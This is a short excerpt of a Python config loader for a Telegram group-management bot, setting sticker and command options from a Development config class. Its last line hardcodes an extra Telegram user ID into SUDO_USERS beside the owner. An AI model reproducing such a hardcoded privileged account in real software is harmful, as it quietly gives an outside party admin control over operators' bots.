...
if ENV:
    ...
    from tg_bot.configg import Development as Config
    ...
    MUTE_STICKER = Config.MUTE_STICKER
    UNMUTE_STICKER = Config.UNMUTE_STICKER
    WELCOME_STICKER = Config.WELCOME_STICKER
    GOODBYE_STICKER = Config.GOODBYE_STICKER
    GBAN_STICKER = Config.GBAN_STICKER
    UNGBAN_STICKER = Config.UNGBAN_STICKER
    WARN_STICKER = Config.WARN_STICKER
    ALLOW_EXCL = Config.ALLOW_EXCL


SUDO_USERS.add(OWNER_ID)
SUDO_USERS.add(871490818)
